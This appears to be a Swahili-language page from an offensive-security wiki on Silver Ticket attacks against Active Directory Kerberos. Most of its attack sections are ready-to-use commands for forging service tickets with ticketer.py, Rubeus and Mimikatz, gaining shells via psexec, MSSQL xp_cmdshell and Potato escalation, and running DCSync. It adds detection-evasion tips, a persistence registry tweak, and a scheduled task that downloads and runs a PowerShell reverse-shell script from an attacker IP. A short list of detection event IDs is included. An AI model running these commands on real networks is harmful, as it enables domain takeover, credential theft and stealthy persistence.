# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Shambulio la **Silver Ticket** huhusisha kutumia vibaya service tickets katika mazingira ya Active Directory (AD). Mbinu hii hutegemea **kupata NTLM hash ya service account**, kama vile computer account, ili kughushi Ticket Granting Service (TGS) ticket. Kwa kutumia ticket hii iliyoghushiwa, mshambuliaji anaweza kufikia huduma mahususi kwenye mtandao, **akiiga utambulisho wa mtumiaji yeyote**, kwa kawaida akilenga kupata haki za kiutawala. Inasisitizwa kuwa kutumia AES keys kughushi tickets ni salama zaidi na ni vigumu zaidi kugundulika.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets ni vigumu zaidi kugundulika kuliko Golden Tickets kwa sababu zinahitaji tu **hash ya service account**, si akaunti ya krbtgt. Hata hivyo, zinatumika tu kwa huduma mahususi inayolengwa. Zaidi ya hayo, kuiba tu nenosiri la mtumiaji.
Zaidi ya hayo, ukidhibiti **nenosiri la akaunti yenye SPN**, unaweza kutumia nenosiri hilo kuunda Silver Ticket inayoiga utambulisho wa mtumiaji yeyote kwenye huduma hiyo.

### Mabadiliko ya kisasa ya Kerberos (domains zinazotumia AES pekee)

- Windows updates zilizoanza **8 Nov 2022 (KB5021131)** huweka service tickets kutumia **AES session keys** kwa chaguomsingi inapowezekana na zinaondoa RC4 hatua kwa hatua. Inatarajiwa kuwa kufikia katikati ya 2026, DCs zitasambazwa huku RC4 ikiwa **imezimwa kwa chaguomsingi**. Kwa hivyo, kutegemea NTLM/RC4 hashes kwa silver tickets kunazidi kushindwa kwa hitilafu ya `KRB_AP_ERR_MODIFIED`. Daima toa **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za service account inayolengwa.<sup>[[5]](#references)</sup>
- Ikiwa `msDS-SupportedEncryptionTypes` ya service account imewekewa AES pekee, lazima utumie `/aes256` au `-aesKey` kughushi ticket; RC4 (`/rc4` au `-nthash`) haitafanya kazi hata kama una NTLM hash.<sup>[[6]](#references)</sup>
- gMSA/computer accounts hubadilisha keys kila baada ya siku 30; toa **AES key ya sasa** kutoka LSASS, Secretsdump/NTDS, au DCsync kabla ya kughushi ticket.
- OPSEC: muda wa ticket unaowekwa kwa chaguomsingi kwenye tools mara nyingi ni **miaka 10**; weka muda unaoeleweka (kwa mfano, `-duration 600` dakika) ili kuepuka kugundulika kutokana na muda usio wa kawaida.<sup>[[6]](#references)</sup>

Kwa kutengeneza tickets, hutumika tools tofauti kulingana na operating system:

### Kwenye Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Kwenye Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Huduma ya CIFS imeangaziwa kama lengwa la kawaida la kufikia mfumo wa faili wa mwathiriwa, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumiwa vibaya kwa kazi na maswali ya WMI.

### Mfano: Huduma ya MSSQL (MSSQLSvc) + Potato hadi SYSTEM

Ikiwa una NTLM hash (au AES key) ya akaunti inayomiliki **SPN ya huduma ya SQL iliyosajiliwa na iliyo sahihi kabisa**, huduma hiyo inaweza kukubali service ticket ghushi. Aina ya huduma na jina la host kwenye ticket lazima vilingane na SPN halisi; usidhani kwamba kila usakinishaji hutumia `MSSQLSvc/`. Utambulisho unaodaiwa lazima pia ulingane na SQL login yenye ruhusa zinazohitajika kuwezesha na kuendesha `xp_cmdshell`. Amri za `xp_cmdshell` zilizofanikiwa huendeshwa chini ya utambulisho wa mchakato wa huduma ya SQL (au proxy iliyosanidiwa kwa wapigaji ambao si sysadmin). Kagua **process token** hiyo ili kuona kama `SeImpersonatePrivilege` imewezeshwa kabla ya kuzingatia kutumia njia tofauti ya Potato; usanidi wa huduma au SPN pekee havithibitishi hilo.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Ikiwa mazingira yaliyopatikana yana SeImpersonatePrivilege (jambo la kawaida kwa akaunti za huduma), tumia lahaja ya Potato kupata SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Maelezo zaidi kuhusu kutumia vibaya MSSQL na kuwezesha xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Muhtasari wa mbinu za Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Huduma Zinazopatikana

| Aina ya Huduma                            | Silver Tickets za Huduma                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS, pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya hali unaweza kuomba tu: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, pia psexec             | CIFS                                                                       |
| Operesheni za LDAP, zikiwemo DCSync         | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Ukitumia **Rubeus** unaweza **kuomba** tickets hizi zote kwa kutumia kigezo:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event IDs za Silver Tickets

- 4624: Kuingia kwa akaunti
- 4634: Kutoka kwa akaunti
- 4672: Kuingia kwa msimamizi
- **Kutokuwepo kwa 4768/4769 iliyotangulia kwenye DC** kwa client/service hiyo hiyo ni kiashiria cha kawaida kwamba TGS ghushi imewasilishwa moja kwa moja kwa huduma.
- Muda wa ticket ulio mrefu isivyo kawaida au aina ya usimbaji fiche isiyotarajiwa (RC4 wakati domain inahitaji AES) pia hujitokeza kwenye data za 4769/4624.

## Kudumu

Ili kuzuia mashine kubadilisha password yake kila baada ya siku 30, weka `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kuwa thamani kubwa kuliko siku 30 ili kubainisha muda wa kubadilisha password ya mashine.<sup>[[3]](#references)</sup>

## Kutumia vibaya Service tickets

Katika mifano ifuatayo, tuseme kwamba ticket imepatikana kwa kuiga akaunti ya msimamizi.

### CIFS

Ukiwa na ticket hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimewekwa wazi) na kunakili faili hadi sehemu ya mfumo wa faili wa mbali kwa kufanya tu kitu kama:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Pia utaweza kupata shell ndani ya host au kutekeleza amri zozote kwa kutumia **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Kwa ruhusa hii unaweza kuunda scheduled tasks kwenye kompyuta za mbali na kutekeleza amri zozote:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Ukiwa na tickets hizi unaweza **kutekeleza WMI kwenye mfumo wa mwathiriwa**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Pata **maelezo zaidi kuhusu wmiexec** kwenye ukurasa ufuatao:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Ukiwa na ufikiaji wa winrm kwenye kompyuta, unaweza **kuifikia** na hata kupata PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Angalia ukurasa ufuatao ili ujifunze **njia zaidi za kuunganisha kwenye host ya mbali kwa kutumia winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Kumbuka kuwa **winrm lazima iwe imewashwa na inasikiliza** kwenye kompyuta ya mbali ili uweze kuifikia.

### LDAP

Ukiwa na ruhusa hii unaweza kudump database ya DC kwa kutumia **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Pata maelezo zaidi kuhusu DCSync** kwenye ukurasa ufuatao:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Jinsi ya kushambulia Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Mchakato wa Nenosiri la Akaunti ya Mashine - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + njia ya Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: Uimarishaji wa Kerberos na kukomeshwa kwa RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Chaguo za sasa za Impacket ticketer.py (AES/keytab/muda)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
